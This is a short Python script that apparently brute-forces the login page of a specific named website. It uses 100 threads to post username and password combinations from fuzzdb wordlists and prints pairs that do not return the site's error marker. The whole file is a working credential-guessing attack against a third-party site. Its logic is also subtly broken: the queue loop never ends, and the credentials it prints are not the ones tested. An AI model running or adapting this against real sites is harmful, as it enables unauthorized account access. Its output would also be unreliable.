import queue
import threading
import time

import requests


# weak username passwd temp to http://www.smartsunchina.com
def weak_password_test():
    while q.empty() is not None:
        payload2 = q.get()
        url = 'http://www.smartsunchina.com/user/login.asp?act=login'
        resp = requests.post(url=url, data=payload2)
        result = resp.content.decode('utf-8')
        if '#36134' not in result:
            print(username + '  ' + password)
            time.sleep(0.1)


if __name__ == '__main__':
    q = queue.Queue()
    for username in open('E://Sec//Tools//字典//fuzzdb//wordlists-user-passwd//names//namelist.txt'):
        for password in open('E://Sec//Tools//字典//fuzzdb//wordlists-user-passwd//passwds//weaksauce.txt'):
            payload = {
                'username': username,
                'password': password
            }
            q.put(payload)
    for item in range(100):
        t = threading.Thread(target=weak_password_test)
        t.start()
